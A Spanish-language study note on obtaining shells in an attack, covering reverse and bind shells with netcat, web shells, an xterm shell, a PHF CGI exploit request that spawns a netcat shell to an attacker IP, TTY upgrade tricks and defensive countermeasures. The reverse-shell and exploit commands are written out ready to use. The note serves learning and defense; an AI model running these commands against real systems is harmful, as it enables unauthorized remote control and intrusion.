---
title: "Obtencion De Shells"
date: 2026-01-26
tags:
  - ciberseguridad
  - redes-protocolos
  - vulnerabilidades-y-amenazas
---
### Obtención de Shells – Nota expandida


> **Relacionado**: [[01-Ciberseguridad/Herramientas/IDOR|IDOR]]. [[01-Ciberseguridad/Herramientas/Netcat|Netcat]]. [[02-Ciencias-Computacion/Redes/Herramientas|Herramientas]]. [[01-Ciberseguridad/Redes-Protocolos/Vulnerabilidades-y-Amenazas/Escalada-de-Privilegios/Escalada-de-Privilegios|Escalada de Privilegios]]. [[Introduccion-a-la-Criptografiaseguridad|12 Introduccion a la Criptografiaseguridad]].

**La obtención de una shell** es el momento clave de un ataque en el que el atacante **logra ejecutar comandos en el sistema de la víctima**, generalmente a través de una terminal interactiva. Obtener una shell representa **tomar el control** de un equipo, al menos parcialmente, y permite al atacante moverse dentro del sistema, escalar privilegios y desplegar herramientas maliciosas o realizar acciones específicas.

---

###  ¿Qué es una "shell"?

Una **shell** es un entorno de línea de comandos que permite **interactuar con el sistema operativo** introduciendo instrucciones. Las más comunes son:

- En Linux: `/bin/bash`, `/bin/sh`, `/bin/zsh`, etc.
    
- En Windows: `cmd.exe`, `powershell.exe`
    

> En ciberseguridad, "obtener una shell" suele implicar tener un **intérprete de comandos remoto** tras explotar una vulnerabilidad.

---

###  Métodos comunes para obtener una shell

#### 1. **Shell directa por vulnerabilidad**

- El exploit lanza directamente una shell sobre el sistema objetivo.
    
- Ejemplo: overflow en un binario SUID que ejecuta `/bin/sh`.
    

#### 2. **Shell inversa (reverse shell)**

- La víctima conecta hacia el atacante y le entrega una terminal.
    
- Es muy útil para evadir firewalls o NAT.
    

 Ejemplo (en Linux):

**Máquina atacante:**

```bash
nc -lvnp 4444
```

**Máquina víctima:**

```bash
nc <IP_atacante> 4444 -e /bin/bash
```

#### 3. **Bind shell**

- La víctima abre un puerto y espera que el atacante se conecte.
    
- Menos sigilosa, más fácil de detectar por IDS.
    

 Víctima:

```bash
nc -lvnp 4444 -e /bin/bash
```

 Atacante:

```bash
nc <IP_víctima> 4444
```

#### 4. **Web shells**

- Archivos como `cmd.php`, `shell.jsp`, `shell.aspx` que permiten ejecutar comandos desde el navegador.
    
- Subidos tras explotar una vulnerabilidad web (por ejemplo, subida de archivos sin validación).
    

#### 5. **Xterm shells (en sistemas con entorno gráfico activo)**

- Envío de comandos que abren una ventana gráfica con una terminal conectada a la máquina del atacante.
    
- Ejemplo:
    

```bash
xterm -display <IP_atacante>:0
```

#### 6. **Telnet inverso / Shell por Netcat sin nc instalado**

- Subir netcat a la víctima si no lo tiene:
    

```bash
rcp atacante:/tmp/nc víctima:/tmp/nc
```

- Ejecutar:
    

```bash
/tmp/nc -e /bin/bash <IP_atacante> 4444
```

---

###  Ejemplo de ataque real (shell mediante PHF vulnerable)

1. El atacante lanza un exploit al CGI vulnerable:
    

```bash
GET /cgi-bin/phf?Qalias=x%0a/bin/nc%20IP_atacante%204444%20-e%20/bin/sh
```

2. La víctima ejecuta el comando.
    
3. El atacante recibe una shell interactiva.
    

---

### ️ Herramientas utilizadas para obtener shells

|Herramienta|Uso principal|
|---|---|
|**Netcat (`nc`)**|Reverse y bind shells simples.|
|**Metasploit**|Módulos automáticos para shells (Meterpreter).|
|**Nishang, PowerShell Empire**|Shells y payloads en Windows.|
|**Webshells (cmd.php, China chopper, etc.)**|Shells en servidores web.|
|**msfvenom**|Crear payloads personalizados.|

---

###  Tipos de shells

|Tipo|Descripción|
|---|---|
|**Interactivas**|Puedes ejecutar comandos como si estuvieras en el terminal.|
|**No interactivas**|Limitadas, suelen necesitar técnicas para mejorar la experiencia (TTY).|
|**TTY mejoradas**|Shells escaladas con soporte completo (`python -c 'import pty; pty.spawn("/bin/bash")'`).|
|**Meterpreter**|Shell avanzada con funciones integradas (subida de archivos, webcam, capturar teclado…).|

---

###  Contramedidas defensivas

1. **Restringir subida y ejecución de archivos**.
    
2. **Segmentar la red y limitar servicios disponibles al exterior**.
    
3. **Usar firewalls internos para detectar conexiones inversas**.
    
4. **Monitorizar creación de procesos sospechosos (con Sysmon o auditd)**.
    
5. **Detectar webshells mediante EDR, análisis de logs y firmas YARA.**
    
6. **Validar entradas y salidas, deshabilitar funciones inseguras en servidores web (como `system()`, `exec()` en PHP).**
    

---

###  Trucos post-acceso

- **Convertir shell limitada en una TTY completa** (Linux):
    

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo; fg
export TERM=xterm
```

- **Redirigir salida estándar** para mejorar shells mal formateadas.
    

---

### Conclusión

**Obtener una shell es un punto de inflexión en un ataque**. A partir de ahí, el atacante tiene control directo sobre el sistema y puede continuar con la escalada de privilegios, persistencia o movimiento lateral. Comprender los distintos tipos y técnicas es clave tanto para pentesters como para defensores.

---